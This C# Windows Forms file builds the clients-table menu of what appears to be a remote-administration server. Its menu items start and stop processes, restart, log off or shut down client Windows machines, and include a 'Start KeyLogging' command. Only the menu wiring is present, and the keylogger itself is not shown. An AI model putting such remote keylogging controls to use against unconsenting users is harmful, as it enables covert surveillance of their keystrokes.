using System;
using System.Windows.Forms;
using PaceCommon;

namespace ExternalControl
{
    class ServerView : IServerView
    {
        private ToolStripMenuItem _startProcessToolStripMenuItem;
        private ToolStripMenuItem _stopProcessToolStripMenuItem;
        private ToolStripMenuItem _showClientDetailsToolStripMenuItem;
        private ToolStripMenuItem _externalProcessToolStripMenuItem;
        private ToolStripMenuItem _restartWindowsToolStripMenuItem;
        private ToolStripMenuItem _logOffWindowsToolStripMenuItem;
        private ToolStripMenuItem _shutDownWindowsToolStripMenuItem;
        private ToolStripMenuItem _startKeyLoggingToolStripMenuItem;

        public ToolStripMenuItem CreateMainMenu()
        {
            return null;
        }

        public ToolStripMenuItem CreateClientsTableMenu()
        {
            _externalProcessToolStripMenuItem = new ToolStripMenuItem();
            this._startProcessToolStripMenuItem = new ToolStripMenuItem();
            this._stopProcessToolStripMenuItem = new ToolStripMenuItem();
            this._showClientDetailsToolStripMenuItem = new ToolStripMenuItem();
            this._restartWindowsToolStripMenuItem = new ToolStripMenuItem();
            this._logOffWindowsToolStripMenuItem = new ToolStripMenuItem();
            this._shutDownWindowsToolStripMenuItem = new ToolStripMenuItem();
            this._startKeyLoggingToolStripMenuItem = new ToolStripMenuItem();
            
            _externalProcessToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] {
            _startProcessToolStripMenuItem,
            _stopProcessToolStripMenuItem,
            _startKeyLoggingToolStripMenuItem,
            _restartWindowsToolStripMenuItem,
            _logOffWindowsToolStripMenuItem,
            _shutDownWindowsToolStripMenuItem,
            _showClientDetailsToolStripMenuItem});
            _externalProcessToolStripMenuItem.Name = "externalProcessToolStripMenuItem";
            _externalProcessToolStripMenuItem.Size = new System.Drawing.Size(100, 20);
            _externalProcessToolStripMenuItem.Text = "ExternalControl";

            _startKeyLoggingToolStripMenuItem.Name = "startKeyLoggingToolStripMenuItem";
            _startKeyLoggingToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            _startKeyLoggingToolStripMenuItem.Text = "Start KeyLogging";
            _startKeyLoggingToolStripMenuItem.Click += ServerControl.RemoteStartKeyLogging;

            _startProcessToolStripMenuItem.Name = "startProcessToolStripMenuItem";
            _startProcessToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            _startProcessToolStripMenuItem.Text = "Start Process";
            _startProcessToolStripMenuItem.Click += ServerControl.RemoteStartProcess;
            
            _stopProcessToolStripMenuItem.Name = "stopProcessToolStripMenuItem";
            _stopProcessToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            _stopProcessToolStripMenuItem.Text = "Stop Process";
            _stopProcessToolStripMenuItem.Click += ServerControl.RemoteStopProcess;
             
            _showClientDetailsToolStripMenuItem.Name = "showClientDetailsToolStripMenuItem";
            _showClientDetailsToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            _showClientDetailsToolStripMenuItem.Text = "Show Client Details";
            _showClientDetailsToolStripMenuItem.Click += ServerControl.ShowClientDetails;

            // System
            _restartWindowsToolStripMenuItem.Name = "restartWindowsToolStripMenuItem";
            _restartWindowsToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            _restartWindowsToolStripMenuItem.Text = "Restart Windows";
            _restartWindowsToolStripMenuItem.Click += ServerControl.RemoteRestartWindows;

            _logOffWindowsToolStripMenuItem.Name = "logOffWindowsToolStripMenuItem";
            _logOffWindowsToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            _logOffWindowsToolStripMenuItem.Text = "Log Off Windows";
            _logOffWindowsToolStripMenuItem.Click += ServerControl.RemoteLogOffWindows;

            _shutDownWindowsToolStripMenuItem.Name = "shutDownWindowsToolStripMenuItem";
            _shutDownWindowsToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            _shutDownWindowsToolStripMenuItem.Text = "Shut Down Windows";
            _shutDownWindowsToolStripMenuItem.Click += ServerControl.RemoteShutDownWindows;


            return _externalProcessToolStripMenuItem;
        }

        public ToolStripMenuItem CreateMainMenuEntryFile()
        {
            return null;
        }

        public ToolStripMenuItem CreateMainMenuEntryEdit()
        {
            return null;
        }

        public ToolStripMenuItem CreateMainMenuEntryRun()
        {
            return null;
        }

        public ToolStripMenuItem CreateMainMenuEntryView()
        {
            return null;
        }

        public ToolStripMenuItem CreateMainMenuEntryHelp()
        {
            return null;
        }
    }
}
